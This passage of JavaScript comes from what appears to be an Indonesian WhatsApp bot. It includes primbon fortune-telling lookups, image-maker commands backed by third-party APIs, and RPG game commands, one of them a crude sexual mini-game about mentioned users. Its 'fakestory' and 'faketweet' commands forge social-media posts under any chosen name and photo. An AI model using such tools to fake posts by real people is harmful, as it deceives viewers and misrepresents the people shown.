reply(`â€¢ *Tanggal Pernikahan :* ${anu.message.tanggal}\nâ€¢ *karakteristik :* ${anu.message.karakteristik}`)
}
break
case 'sifatusaha': {

if (!ext)return reply(`Contoh : ${prefix+ command} 28, 12, 2021`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.sifat_usaha_bisnis(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
reply(`â€¢ *Lahir :* ${anu.message.hari_lahir}\nâ€¢ *Usaha :* ${anu.message.usaha}`)
}
break
case  ' rejeki': case 'rezeki': {

if (!text) return reply(`Contoh : ${cmd} 7, 7, 2005`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.rejeki_hoki_weton(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
reply(`â€¢ *Lahir :* ${anu.message.hari_lahir}\nâ€¢ *Rezeki :* ${anu.message.rejeki}\nâ€¢ *Catatan :* ${anu.message.catatan}`)
}
break
case 'pekerjaan': {

if (!text) return reply(`Contoh : ${cmd} 7, 7, 2005`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.pekerjaan_weton_lahir(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
reply(`â€¢ *Lahir :* ${anu.message.hari_lahir}\nâ€¢ *Pekerjaan :* ${anu.message.pekerjaan}\nâ€¢ *Catatan :* ${anu.message.catatan}`)
}
break
case 'ramalannasib': case 'ramalnasib': case 'nasib': {

if (!text) return reply(`Contoh : 7, 7, 2005`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.ramalan_nasib(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
reply(`â€¢ *Analisa :* ${anu.message.analisa}\nâ€¢ *Angka Akar :* ${anu.message.angka_akar}\nâ€¢ *Sifat :* ${anu.message.sifat}\nâ€¢ *Elemen :* ${anu.message.elemen}\nâ€¢ *Angka Keberuntungan :* ${anu.message.angka_keberuntungan}`)
}
break
case 'potensipenyakit': case 'penyakit': {

if (!text) return reply(`Contoh : ${cmd} 7, 7, 2005`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.cek_potensi_penyakit(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
reply(`â€¢ *Analisa :* ${anu.message.analisa}\nâ€¢ *Sektor :* ${anu.message.sektor}\nâ€¢ *Elemen :* ${anu.message.elemen}\nâ€¢ *Catatan :* ${anu.message.catatan}`)
}
break
case 'artitarot': case 'tarot': {

if (!text) return reply(`Contoh : ${cmd} 7, 7, 2005`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.arti_kartu_tarot(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
sock.sendImage(m.chat, anu.message.image, `â€¢ *Lahir :* ${anu.message.tgl_lahir}\nâ€¢ *Simbol Tarot :* ${anu.message.simbol_tarot}\nâ€¢ *Arti :* ${anu.message.arti}\nâ€¢ *Catatan :* ${anu.message.catatan}`)
}
break
case 'fengshui': {

if (!text) return `Contoh : ${cmd} Dika, 1, 2005\n\nNote : ${cmd} Nama, gender, tahun lahir\nGender : 1 untuk laki-laki & 2 untuk perempuan`
let [nama, gender, tahun] = text.split`,`
let anu = await primbon.perhitungan_feng_shui(nama, gender, tahun)
if (anu.status == false) return reply(anu.message)
reply(`â€¢ *Nama :* ${anu.message.nama}\nâ€¢ *Lahir :* ${anu.message.tahun_lahir}\nâ€¢ *Gender :* ${anu.message.jenis_kelamin}\nâ€¢ *Angka Kua :* ${anu.message.angka_kua}\nâ€¢ *Kelompok :* ${anu.message.kelompok}\nâ€¢ *Karakter :* ${anu.message.karakter}\nâ€¢ *Sektor Baik :* ${anu.message.sektor_baik}\nâ€¢ *Sektor Buruk :* ${anu.message.sektor_buruk}`)
}
break
case 'haribaik': {

if (!text) return reply(`Contoh : ${cmd} 7, 7, 2005`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.petung_hari_baik(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
reply(`â€¢ *Lahir :* ${anu.message.tgl_lahir}\nâ€¢ *Kala Tinantang :* ${anu.message.kala_tinantang}\nâ€¢ *Info :* ${anu.message.info}\nâ€¢ *Catatan :* ${anu.message.catatan}`)
}
break
case 'harisangar': case 'taliwangke': {

if (!text) return reply(`Contoh : ${cmd} 7, 7, 2005`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.hari_sangar_taliwangke(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
reply(`â€¢ *Lahir :* ${anu.message.tgl_lahir}\nâ€¢ *Hasil :* ${anu.message.result}\nâ€¢ *Info :* ${anu.message.info}\nâ€¢ *Catatan :* ${anu.message.catatan}`)
}
break
case 'harinaas': case 'harisial': {

if (!text) return reply(`Contoh : ${cmd} 7, 7, 2005`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.primbon_hari_naas(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
reply(`â€¢ *Hari Lahir :* ${anu.message.hari_lahir}\nâ€¢ *Tanggal Lahir :* ${anu.message.tgl_lahir}\nâ€¢ *Hari Naas :* ${anu.message.hari_naas}\nâ€¢ *Info :* ${anu.message.catatan}\nâ€¢ *Catatan :* ${anu.message.info}`)
}
break
case 'nagahari': case 'harinaga': {

if (!text) return reply(`Contoh : ${cmd} 7, 7, 2005`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.rahasia_naga_hari(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
reply(`â€¢ *Hari Lahir :* ${anu.message.hari_lahir}\nâ€¢ *Tanggal Lahir :* ${anu.message.tgl_lahir}\nâ€¢ *Arah Naga Hari :* ${anu.message.arah_naga_hari}\nâ€¢ *Catatan :* ${anu.message.catatan}`)
}
break
case 'arahrejeki': case 'arahrezeki': {

if (!text) return reply(`Contoh : ${cmd} 7, 7, 2005`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.primbon_arah_rejeki(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
reply(`â€¢ *Hari Lahir :* ${anu.message.hari_lahir}\nâ€¢ *tanggal Lahir :* ${anu.message.tgl_lahir}\nâ€¢ *Arah Rezeki :* ${anu.message.arah_rejeki}\nâ€¢ *Catatan :* ${anu.message.catatan}`)
}
break
case 'peruntungan': {

if (!text) return reply(`Contoh : ${cmd} DIka, 7, 7, 2005, 2022\n\nNote : ${cmd} Nama, tanggal lahir, bulan lahir, tahun lahir, untuk tahun`)
let [nama, tgl, bln, thn, untuk] = text.split`,`
let anu = await primbon.ramalan_peruntungan(nama, tgl, bln, thn, untuk)
if (anu.status == false) return reply(anu.message)
reply(`â€¢ *Nama :* ${anu.message.nama}\nâ€¢ *Lahir :* ${anu.message.tgl_lahir}\nâ€¢ *Peruntungan Tahun :* ${anu.message.peruntungan_tahun}\nâ€¢ *Hasil :* ${anu.message.result}\nâ€¢ *Catatan :* ${anu.message.catatan}`)
}
break
case 'weton': case 'wetonjawa': {

if (!text) return reply(`Contoh : ${cmd} 7, 7, 2005`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.weton_jawa(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
reply(`â€¢ *Tanggal :* ${anu.message.tanggal}\nâ€¢ *Jumlah Neptu :* ${anu.message.jumlah_neptu}\nâ€¢ *Watak Hari :* ${anu.message.watak_hari}\nâ€¢ *Naga Hari :* ${anu.message.naga_hari}\nâ€¢ *Jam Baik :* ${anu.message.jam_baik}\nâ€¢ *Watak Kelahiran :* ${anu.message.watak_kelahiran}`)
}
break
case 'sifat': case 'karakter': {

if (!text) return reply(`Contoh : ${cmd} Dika, 7, 7, 2005`)
let [nama, tgl, bln, thn] = text.split`,`
let anu = await primbon.sifat_karakter_tanggal_lahir(nama, tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
reply(`â€¢ *Nama :* ${anu.message.nama}\nâ€¢ *Lahir :* ${anu.message.tgl_lahir}\nâ€¢ *Garis Hidup :* ${anu.message.garis_hidup}`)
}
break
case 'keberuntungan': {

if (!text) return reply(`Contoh : ${cmd} Dika, 7, 7, 2005`)
let [nama, tgl, bln, thn] = text.split`,`
let anu = await primbon.potensi_keberuntungan(nama, tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
reply(`â€¢ *Nama :* ${anu.message.nama}\nâ€¢ *Lahir :* ${anu.message.tgl_lahir}\nâ€¢ *Hasil :* ${anu.message.result}`)
}
break
case 'memancing': {

if (!text) return reply(`Contoh : ${cmd} 12, 1, 2022`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.primbon_memancing_ikan(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
reply(`â€¢ *Tanggal :* ${anu.message.tgl_memancing}\nâ€¢ *Hasil :* ${anu.message.result}\nâ€¢ *Catatan :* ${anu.message.catatan}`)
}
break

case 'masasubur': {

if (!text) return reply(`Contoh : ${cmd} 12, 1, 2022, 28\n\nNote : ${cmd} hari pertama menstruasi, siklus`)
let [tgl, bln, thn, siklus] = text.split`,`
let anu = await primbon.masa_subur(tgl, bln, thn, siklus)
if (anu.status == false) return reply(anu.message)
reply(`â€¢ *Hasil :* ${anu.message.result}\nâ€¢ *Catatan :* ${anu.message.catatan}`)
}
break
case 'zodiak': case 'zodiac': {

if (!text) return reply(`Contoh : ${prefix+ command} 7 7 2005`)
let zodiak = [
["capricorn", new Date(1970, 0, 1)],
["aquarius", new Date(1970, 0, 20)],
["pisces", new Date(1970, 1, 19)],
["aries", new Date(1970, 2, 21)],
["taurus", new Date(1970, 3, 21)],
["gemini", new Date(1970, 4, 21)],
["cancer", new Date(1970, 5, 22)],
["leo", new Date(1970, 6, 23)],
["virgo", new Date(1970, 7, 23)],
["libra", new Date(1970, 8, 23)],
["scorpio", new Date(1970, 9, 23)],
["sagittarius", new Date(1970, 10, 22)],
["capricorn", new Date(1970, 11, 22)]
].reverse()

function getZodiac(month, day) {
let d = new Date(1970, month - 1, day)
return zodiak.find(([_,_d]) => d >= _d)[0]
}
let date = new Date(text)
if (date == 'Invalid Date') return date
let d = new Date()
let [tahun, bulan, tanggal] = [d.getFullYear(), d.getMonth() + 1, d.getDate()]
let birth = [date.getFullYear(), date.getMonth() + 1, date.getDate()]

let zodiac = await getZodiac(birth[1], birth[2])

let anu = await primbon.zodiak(zodiac)
if (anu.status == false) return reply(anu.message)
reply(`â€¢ *Zodiak :* ${anu.message.zodiak}\nâ€¢ *Nomor :* ${anu.message.nomor_keberuntungan}\nâ€¢ *Aroma :* ${anu.message.aroma_keberuntungan}\nâ€¢ *Planet :* ${anu.message.planet_yang_mengitari}\nâ€¢ *Bunga :* ${anu.message.bunga_keberuntungan}\nâ€¢ *Warna :* ${anu.message.warna_keberuntungan}\nâ€¢ *Batu :* ${anu.message.batu_keberuntungan}\nâ€¢ *Elemen :* ${anu.message.elemen_keberuntungan}\nâ€¢ *Pasangan Zodiak :* ${anu.message.pasangan_zodiak}\nâ€¢ *Catatan :* ${anu.message.catatan}`)
}
break
case 'shio': {

if (!text) return reply(`Contoh : ${cmd} tikus\n\nNote : For Detail https://primbon.com/shio.htm`)
let anu = await primbon.shio(text)
if (anu.status == false) return reply(anu.message)
reply(`â€¢ *Hasil :* ${anu.message}`)
}
break
/*
      MAKER
     
*/
case "gura":
case "togura": {
const q = m.quoted ? m.quoted : m;
    const mime = (q.msg || q).mimetype || '';
 
    if (!/image/.test(mime)) {
        return reply(`mana foto nya?`);
    }
 
    reply('Loading...');

    try {
        
        let media = await sock.downloadAndSaveMediaMessage(quoted);
        let directLink = await CatBox(media);
        
        const apiUrl = `https://api.nekolabs.web.id/canvas/gura?imageUrl=${directLink}`;
        
        const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
        const imageBuffer = Buffer.from(response.data);
 
        const finalCaption = ``;
 
        await sock.sendMessage(m.chat, {
            image: imageBuffer,
            caption: ""
        }, { quoted: fakeQuoted });
 
    } catch (error) {
        console.error('Error di fitur aiedit:', error);
        reply(`âŒ Terjadi kesalahan saat memproses gambar.`);
    } finally {
        if (mediaPath && fs.existsSync(mediaPath)) {
            fs.unlinkSync(mediaPath);
        }
    }
}
break
case "carbonify": {
  try {
    if (!text) return reply(".carbonify const axios = require('axios')")
    
    React()

    const image = `https://api.nekolabs.web.id/cnv/carbonify?code=${encodeURIComponent(text)}`

    await sock.sendMessage(
      m.chat,
      {
        image: { url: image },
        caption: ""
      },
      { quoted: fakeQuoted }
    )

  } catch (err) {
    console.error('Error carbonify:', err)
    reply('âŒ Terjadi kesalahan saat membuat carbonify')
  }
}
break
async function translateToEnglish(text) {
    try {
        const url = "https://translate.googleapis.com/translate_a/single"
        const params = {
            client: "gtx",
            sl: "auto",
            tl: "en",
            dt: "t",
            q: text,
        }
        const res = await axios.get(url, { params })
        return res.data[0][0][0]
    } catch (err) {
        return text
    }
}
 
async function creartTxt2Img(prompt) {
    try {
        const translatedPrompt = await translateToEnglish(prompt)
        const form = new FormData()
        form.append("prompt", translatedPrompt)
        form.append("input_image_type", "text2image")
        form.append("aspect_ratio", "4x5")
        form.append("guidance_scale", "9.5")
        form.append("controlnet_conditioning_scale", "0.5")
        
        const response = await axios.post(
            "https://api.creartai.com/api/v2/text2image",
            form,
            {
                headers: form.getHeaders(),
                responseType: "arraybuffer",
            }
        )
        return Buffer.from(response.data)
    } catch (err) {
        throw new Error(err?.message || err)
    }
}
 
async function creartImg2Img(prompt, imageBuffer) {
    try {
        const translatedPrompt = await translateToEnglish(prompt)
        const form = new FormData()
        form.append("prompt", translatedPrompt)
        form.append("input_image_type", "image2image")
        form.append("aspect_ratio", "4x5")
        form.append("guidance_scale", "9.5")
        form.append("controlnet_conditioning_scale", "0.5")
        form.append("image_file", imageBuffer, "image.png")
        
        const response = await axios.post(
            "https://api.creartai.com/api/v2/image2image",
            form,
            {
                headers: form.getHeaders(),
                responseType: "arraybuffer",
            }
        )
        return Buffer.from(response.data)
    } catch (err) {
        throw new Error(err?.message || err)
    }
}
 
case 'txt2img':
case 'img2img': {
React()
    try {
        const prompt = args.join(' ')
        if (!prompt) return reply(`Example : ${cmd} Pemandangan Gunung Fuji/ubah menjadi malam hari`)
 
        switch (command.toLowerCase()) {
            case 'txt2img':
                const txtBuffer = await creartTxt2Img(prompt)
                await sock.sendMessage(m.chat, {
                    image: txtBuffer,
                }, { quoted: fakeQuoted })
                break
 
            case 'img2img':
                const q = m.quoted ? m.quoted : m
                const mime = (q.msg || q).mimetype || ''
                if (!mime.startsWith('image/')) return reply('Mna Gambar Nya Bang')
                const imageBuffer = await q.download()
                const imgBuffer = await creartImg2Img(prompt, imageBuffer)
                await sock.sendMessage(m.chat, {
                    image: imgBuffer,
                }, { quoted: fakeQuoted })
                break
        }
    } catch (e) {
        reply(e.message)
    }
}
break
case "animegirl": {
  try {
    if (!text) return reply(`Contoh:\n${prefix + command} hai`);

    let url = `https://api.zenitsu.web.id/api/maker/animegirl/image?text=${encodeURIComponent(text)}`;

    await sock.sendMessage(
      m.chat,
      {
        image: { url: url },
        caption: `âœ¨ Anime Girl\nğŸ“ Teks: ${text}`
      },
      { quoted: fakeQuoted }
    );
  } catch (err) {
    console.error(err);
    reply("âŒ Gagal mengambil gambar animegirl.");
  }
}
break;         
case "attp": {
  try {
    if (!text) return reply(`Contoh:\n${prefix + command} hai guys`);

    const url = `https://api.zenitsu.web.id/api/maker/attp?text=${encodeURIComponent(text)}`;

    // ambil gambar attp
    const res = await axios.get(url, {
      responseType: "arraybuffer"
    });

    let buffer = res.data;

    // kirim sebagai sticker
    await sock.sendImageAsSticker(
      m.chat,
      buffer,
      m,
      {
        packname: "ATTP",
        author: "Bot"
      }
    );

  } catch (err) {
    console.error(err);
    reply("âŒ Gagal membuat sticker ATTP.");
  }
}
break;
case "fakestory": {
  try {
    if (!text) {
      return reply(
        `Format:\n${prefix + command} username | caption\n\nğŸ“Œ Reply foto untuk PP`
      );
    }

    // ambil image dari reply
    let quoted = m.quoted ? m.quoted : m;
    let mime = (quoted.msg || quoted).mimetype || "";

    if (!/image/.test(mime))
      return reply("âŒ Reply foto yang akan dijadikan PP fake story");

    // parsing user | caption
    let [user, caption] = text.split("|").map(v => v.trim());
    if (!user || !caption)
      return reply(`âŒ Format salah!\nContoh:\n${prefix + command} zion | Hello`);

    // download image
    let buffer = await quoted.download();

    // upload ke CatBox
    let form = new FormData();
    form.append("reqtype", "fileupload");
    form.append("fileToUpload", buffer, {
      filename: "pp.jpg"
    });

    let upload = await axios.post(
      "https://catbox.moe/user/api.php",
      form,
      { headers: form.getHeaders() }
    );

    let ppUrl = upload.data.trim();
    if (!ppUrl.startsWith("http"))
      return reply("âŒ Gagal upload ke CatBox");

    // generate fakestory
    let apiUrl = `https://api.zenitsu.web.id/api/maker/fakestory?user=${encodeURIComponent(
      user
    )}&caption=${encodeURIComponent(caption)}&pp=${encodeURIComponent(ppUrl)}`;

    await sock.sendMessage(
      m.chat,
      {
        image: { url: apiUrl },
        caption: `âœ¨ Fake Story\nğŸ‘¤ User: ${user}\nğŸ“ Caption: ${caption}`
      },
      { quoted: fakeQuoted }
    );
  } catch (err) {
    console.error(err);
    reply("âŒ Error membuat Fake Story.");
  }
}
break;
case "faketweet": {
  try {
    if (!text)
      return reply(
        `Format:\n${prefix + command} user | nama | komentar\n\nğŸ“Œ Reply foto untuk PP`
      );

    // ambil image dari reply
    let quoted = m.quoted ? m.quoted : m;
    let mime = (quoted.msg || quoted).mimetype || "";

    if (!/image/.test(mime))
      return reply("âŒ Reply foto untuk dijadikan PP Twitter");

    // parsing text
    let [user, name, comment] = text.split("|").map(v => v.trim());
    if (!user || !name || !comment)
      return reply(
        `âŒ Format salah!\nContoh:\n${prefix + command} zion | Nama | Halo Twitter`
      );

    // download image
    let buffer = await quoted.download();

    // upload ke CatBox
    let form = new FormData();
    form.append("reqtype", "fileupload");
    form.append("fileToUpload", buffer, { filename: "pp.jpg" });

    let upload = await axios.post(
      "https://catbox.moe/user/api.php",
      form,
      { headers: form.getHeaders() }
    );

    let ppUrl = upload.data.trim();
    if (!ppUrl.startsWith("http"))
      return reply("âŒ Gagal upload PP ke CatBox");

    // faketweet api
    let apiUrl = `https://api.zenitsu.web.id/api/maker/faketweet?user=${encodeURIComponent(
      user
    )}&name=${encodeURIComponent(name)}&comment=${encodeURIComponent(
      comment
    )}&pp=${encodeURIComponent(ppUrl)}`;

    await sock.sendMessage(
      m.chat,
      {
        image: { url: apiUrl },
        caption: `ğŸ¦ Fake Tweet\n@${user}\n${comment}`
      },
      { quoted: fakeQuoted }
    );
  } catch (e) {
    console.error(e);
    reply("âŒ Gagal membuat Fake Tweet.");
  }
}
break;
case "ttp": {
  try {
    if (!text) return reply(`Contoh:\n${prefix + command} hai`);

    const url = `https://api.zenitsu.web.id/api/maker/ttp?text=${encodeURIComponent(text)}`;

    // download image hasil ttp
    const res = await axios.get(url, {
      responseType: "arraybuffer"
    });

    let buffer = res.data;

    // kirim sebagai sticker
    await sock.sendImageAsSticker(
      m.chat,
      buffer,
      m,
      {
        packname: "TTP",
        author: "Bot"
      }
    );

  } catch (err) {
    console.error(err);
    reply("âŒ Gagal membuat sticker TTP.");
  }
}
break;
// RPG
case 'atm':
  case 'atmall': {
    const saldoplus = 1
    let setting = JSON.parse(fs.readFileSync('./rpg.json'))
    if (setting.rpgsetStats) return reply('Fitur rpg dimatikan oleh owner')
    if (!global.db.erpg[m.sender].rpg) return reply(`â€” *Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
    let suffix = command.replace(/^atm/i, '').trim()
    let count
    if (suffix) {
      if (/^all$/i.test(suffix) || /^all$/i.test(args[0])) {
        count = Math.floor(global.db.users[m.sender].saldo / saldoplus)
      } else {
        count = Math.floor(Number(args[0] || suffix))
      }
    } else if (args[0]) {
      if (/^all$/i.test(args[0])) {
        count = Math.floor(global.db.users[m.sender].saldo / saldoplus)
      } else {
        count = Math.floor(Number(args[0]))
      }
    } else {
      count = 1
    }
    if (!Number.isFinite(count)) return reply('Jumlah tidak valid.\nContoh: atm 5 / atm all')
    count = Math.max(1, count)
    if (global.db.users[m.sender].saldo < saldoplus * count) return reply(`Saldo tidak mencukupi untuk menabung ${count} ATM`)
    if (!global.db.erpg[m.sender]) global.db.erpg[m.sender] = { bank: 0 }
    global.db.users[m.sender].saldo -= saldoplus * count
    global.db.erpg[m.sender].bank += count
    reply(`-${saldoplus * count} saldo\n+${count} ATM`)
    break
  }

  case 'atmambil':
  case 'atmwithdraw':
  case 'atmpull':
  case 'atm-tarik':
  case 'atmkeluar':
  case 'atmtake':
  case 'atmkeluarin':
  case 'atm-cairkan':
  case 'atm-penarikan': {
    const saldoplus = 1
    let setting = JSON.parse(fs.readFileSync('./rpg.json'))
    if (setting.rpgsetStats) return reply('Fitur rpg dimatikan oleh owner')
    if (!global.db.erpg[m.sender].rpg) return reply(`â€” *Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
    if (!global.db.erpg[m.sender]) global.db.erpg[m.sender] = { bank: 0 }
    let count = args[0]?.toLowerCase() === 'all' ? global.db.erpg[m.sender].bank : Math.floor(Number(args[0] || 1))
    if (!Number.isFinite(count) || count < 1) return reply('Jumlah tidak valid.\nContoh: atmambil 5 / atmambil all')
    if (global.db.erpg[m.sender].bank < count) return reply('ATM kamu tidak mencukupi')
    global.db.erpg[m.sender].bank -= count
    global.db.users[m.sender].saldo += saldoplus * count
    reply(`-${count} ATM\n+${saldoplus * count} saldo`)
    break
  }

  case 'bank': {
    let setting = JSON.parse(fs.readFileSync('./rpg.json'))
    if (setting.rpgsetStats) return reply('Fitur rpg dimatikan oleh owner')
    if (!global.db.erpg[m.sender].rpg) return reply(`â€” *Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
    if (!global.db.erpg[m.sender]) global.db.erpg[m.sender] = { bank: 0 }
    let caption = `â›Šã€Œ *B A N K  U S E R* ã€\nâ”‚ ğŸ“› *Name:* ${db.users[m.sender].nama}\nâ”‚ ğŸ›ï¸ *ATM:* ${global.db.erpg[m.sender].bank}\nâ”‚ ğŸ’¹ *Saldo:* ${db.users[m.sender].saldo}\nâ”‚ ğŸŒŸ *Status:* ${isPremium ? 'Premium' : 'Free'}\nâ”‚ ğŸ“‘ *Registered:* ${db.users[m.sender].registered ? 'Yes' : 'No'}\nâ•°â”€â”€â”ˆâ”ˆâ­‘`
    sock.sendMessage(m.chat, { text: caption, contextInfo: { externalAdReply: { title: "BANK USER", body: "Info bank user", thumbnailUrl: "https://telegra.ph/file/8172419ad03cd5782f12d.jpg", mediaType: 1, renderLargerThumbnail: true } } }, { quoted: m })
    break
  }

  case 'dompet': {
    let setting = JSON.parse(fs.readFileSync('./rpg.json'))
    if (setting.rpgsetStats) return reply('Fitur rpg dimatikan oleh owner')
    if (!global.db.erpg[m.sender].rpg) return reply(`â€” *Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
    let who = m.isGroup ? m.mentionedJid[0] || m.sender : m.sender
    if (!global.db.users[who]) return reply('User tidak ditemukan')
    if (!global.db.erpg[who]) global.db.erpg[who] = { bank: 0 }
    let text = `ğŸ¦ Bank: ${global.db.erpg[who].bank}\nâœ¨ Exp: ${global.db.users[who].exp}\nğŸ“Š Limit: ${global.db.users[who].limit}\nğŸ’µ Money: ${global.db.users[who].saldo}`
    sock.sendMessage(m.chat, { text, contextInfo: { externalAdReply: { title: "ISI DOMPET", body: "Info dompet user", thumbnailUrl: "https://telegra.ph/file/bb562cfd966da4ed5b81a.jpg", mediaType: 1, renderLargerThumbnail: true } } }, { quoted: m })
    break
  }

  case 'joinrpg': {
    let setting = JSON.parse(fs.readFileSync('./rpg.json'))
    if (setting.rpgsetStats) return reply('Fitur rpg dimatikan oleh owner')
    if (global.db.erpg[m.sender].rpg) return reply(`Kamu Telah Join Sebelumnya`)
    global.db.erpg[m.sender].rpg = true
    let joinedrpg = `*GAME RPG STARTED*\n\nKamu telah login RPG-Game, sekarang kamu dapat menggunakan command RPG`
    await sock.sendMessage(m.chat, { text: joinedrpg, contextInfo: { mentionedJid: [m.sender], forwardingScore: 9999, isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: null + "@newsletter", serverMessageId: null, newsletterName: `${namaBot}` }, externalAdReply: { title: "RPG-GAME (Pirate Adventure)", body: 'Pirate adventure in search of riches', thumbnailUrl: "https://telegra.ph/file/d661d7829411b8bff9f5f.jpg", sourceUrl: "-", mediaType: 1, renderLargerThumbnail: true } } }, { quoted: fakeQuoted })
    break
  }

  case 'exitrpg': {
    let setting = JSON.parse(fs.readFileSync('./rpg.json'))
    if (setting.rpgsetStats) return reply('Fitur rpg dimatikan oleh owner')
    global.db.erpg[m.sender].rpg = false
    let joinedrpg = `*GAME RPG EXIT*\n\nKamu telah exit RPG-Game, sekarang kamu tidak dapat menggunakan command RPG`
    await sock.sendMessage(m.chat, { text: joinedrpg, contextInfo: { mentionedJid: [m.sender], forwardingScore: 9999, isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: null + "@newsletter", serverMessageId: null, newsletterName: `${namaBot}` }, externalAdReply: { title: "RPG-GAME EXIT", body: '-', thumbnailUrl: "https://telegra.ph/file/1c66154afd9707a84a4a3-1428c0a054c1effa10.jpg", sourceUrl: "-", mediaType: 1, renderLargerThumbnail: true } } }, { quoted: fakeQuoted })
    break
  }

  case 'wikwik': {
    let setting = JSON.parse(fs.readFileSync('./rpg.json'))
    if (setting.rpgsetStats) return reply('Fitur rpg dimatikan oleh owner')
    if (!global.db.erpg[m.sender].rpg) return reply(`â€” *Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
    if (global.db.erpg[m.sender].stamina <= 15) return reply(`Kamu tidak bisa ewe anak orang, stamina kamu ${global.db.erpg[m.sender].stamina}%\n\nPulihkan stamina menggunakan potion,\nContoh : .heal`)
    if (!q) return reply(`Contoh: ${cmd} sock`)
    const argsLower = args.map(arg => arg.toLowerCase())
    const petarung1 = argsLower[0]
    const petarung2 = argsLower[1]
    const totalRounds = 8
    let ronde = 1
    let nyawaPetarung1 = 200
    let nyawaPetarung2 = 200
    let result = `ğŸ«¶ Wikwik antara ${db.users[m.sender].nama} dan ${args[0]} dimulai!\n\n`
    while (ronde <= totalRounds && nyawaPetarung1 > 0 && nyawaPetarung2 > 0) {
      const pukulan = ['ajul gedang', 'gaya marmot', 'gaya roket', 'gaya kucing', 'gaya katak']
      const pilihanPetarung1 = pukulan[Math.floor(Math.random() * pukulan.length)]
      const pilihanPetarung2 = pukulan[Math.floor(Math.random() * pukulan.length)]
      const damagePetarung1 = Math.floor(Math.random() * 50) + 1
      const damagePetarung2 = Math.floor(Math.random() * 50) + 1
      result += `ğŸ’¦ Ronde ${ronde}\n${db.users[m.sender].nama} stamina: ${nyawaPetarung1}\n${args[0]} stamina: ${nyawaPetarung2}\n${db.users[m.sender].nama}: ${pilihanPetarung1}\n${args[0]}: ${pilihanPetarung2}\n\n`
      if (pilihanPetarung1 === pilihanPetarung2) {
        result += `âš”ï¸ Wikwik sedang berlangsung melakukan gaya yang sama! blom ada yang keluar sama sekali.\n`
      } else {
        result += `ğŸ’¦ ${db.users[m.sender].nama} melakukan ${pilihanPetarung1} dan ${args[0]} melakukan ${pilihanPetarung2}!\n`
        nyawaPetarung1 -= pilihanPetarung2 === 'jab' ? damagePetarung1 : damagePetarung1 + 10
        nyawaPetarung2 -= pilihanPetarung1 === 'jab' ? damagePetarung2 : damagePetarung2 + 10
        result += `ğŸ’” ${db.users[m.sender].nama} menerima jilmek ${nyawaPetarung1 >= 0 ? damagePetarung1 : 0}!\n`
        result += `ğŸ’” ${args[0]} menerima spong ${nyawaPetarung2 >= 0 ? damagePetarung2 : 0}!\n\n--------------------------------------------------\n`
      }
      ronde++
    }
    result += `\nâ±ï¸ Wikwik akhirnya berakhir!\n${db.users[m.sender].nama} stamina akhir: ${nyawaPetarung1}\n${args[0]} stamina akhir: ${nyawaPetarung2}\n`
    if (nyawaPetarung1 > nyawaPetarung2) {
      result += `ğŸ‘™ ${db.users[m.sender].nama} memenangkan pertandingan dengan keluar cairan yang lebih banyak!\n`
    } else if (nyawaPetarung2 > nyawaPetarung1) {
      result += `ğŸ©² ${args[0]} memenangkan pertandingan dengan keluar cairan yang lebih banyak!\n`
    } else {
      result += `ğŸ‘™ğŸ’¦ Pertandingan berakhir imbang! Kedua yang wikwik memiliki stamina yang sama.\n`
    }
    global.db.erpg[m.sender].stamina -= 50
    await sock.sendTextWithMentions(m.chat, result, m)
    break
  }

  case 'ngojek':
  case 'ojek': {
    let setting = JSON.parse(fs.readFileSync('./rpg.json'))
    if (setting.rpgsetStats) return reply('Fitur rpg dimatikan oleh owner')
    if (!global.db.erpg[m.sender].rpg) return reply(`â€” *Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
    if (!text) return reply(`Contoh: ${cmd} lampung|Jakarta\n\n*PENJELASAN*\n${cmd} [dari]|[tujuan] / Lampung ke Jakarta`)
    if (global.db.erpg[m.sender].stamina < 1) return reply(`Kamu Lemah, stamina kamu ${global.db.erpg[m.sender].stamina}%\n\nKetik _.heal_`)
    const arg1 = args.join(" ")
    const arg2 = arg1.split("|")[0]
    const arg3 = arg1.split("|")[1]
    if (!arg2) return !0
    if (!arg3) return !0
    let hah = ["Udin", "Yono", "Agus", "Asep", "Yanto", "Ahmad", "Riski", "Ridho", "Egy", "Pegi", "Rehan", "Yanti", "Putri", "Rahma", "Ica", "Caca", "Ayu", "Rini", "Lani", "Cika", "Nisa", "Alya", "Fikri", "Edo", "Angga", "Putra", "Yahya", "Fahri", "Fadil", "Aldo", "Resky", "Bela", "Kiki", "Zaki", "Reza", "Kak gem", "Uni bakwan"]
    let orgnya = hah[Math.floor(Math.random() * hah.length)]
